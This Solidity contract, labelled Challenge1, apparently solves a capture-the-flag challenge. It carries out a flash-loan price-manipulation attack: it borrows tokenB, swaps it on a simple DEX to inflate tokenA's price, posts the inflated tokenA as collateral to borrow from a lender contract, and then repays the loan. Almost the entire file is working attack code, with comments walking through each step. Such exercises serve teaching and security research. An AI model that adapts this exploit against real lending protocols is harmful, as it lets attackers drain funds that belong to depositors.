// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// interface of contract FlahLoanPool.sol
interface IFlashLoanPool {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

// interface of contract SimpleDEX.sol
interface ISimpleDEX {
    function swap(address tokenIn, uint256 amountIn) external;
}

// interface of contract VulnerableLender.sol
interface IVulnerableLender {
    function depositAndBorrow(uint256 collateralAmount) external;
}

contract Challenge1{
    using SafeERC20 for IERC20;

    IFlashLoanPool public pool;
    ISimpleDEX public dex;
    IVulnerableLender public lender;
    IERC20 public tokenA;
    IERC20 public tokenB;

    constructor(address _pool, address _dex, address _lender, address _tokenA, address _tokenB) {
        pool = IFlashLoanPool(_pool);
        dex = ISimpleDEX(_dex);
        lender = IVulnerableLender(_lender);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    // 1. start the attack
    function attack(uint256 amount) external {
        pool.flashLoan(address(tokenB), amount, "");
    }

    // 2. The callback function the pool calls during flashLoan
    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {        
        // Step A: Approve the DEX to spend your borrowed TokenB
        tokenB.approve(address(dex), amount);
        // Step B: Swap the borrowed TokenB for TokenA on the DEX 
        // (This makes TokenA price go UP)
        dex.swap(token, amount);
        // Step C: Approve the Lender to spend your (now very valuable) TokenA
        uint256 collateralAmount = tokenA.balanceOf(address(this));
        tokenA.approve(address(lender), collateralAmount);
        // Step D: Call depositAndBorrow on the lender
        lender.depositAndBorrow(collateralAmount);
        // Step E: Repay the Flash Loan (transfer 'amount' of tokenB back to 'msg.sender')
        IERC20(token).safeTransfer(msg.sender, amount);
    }
}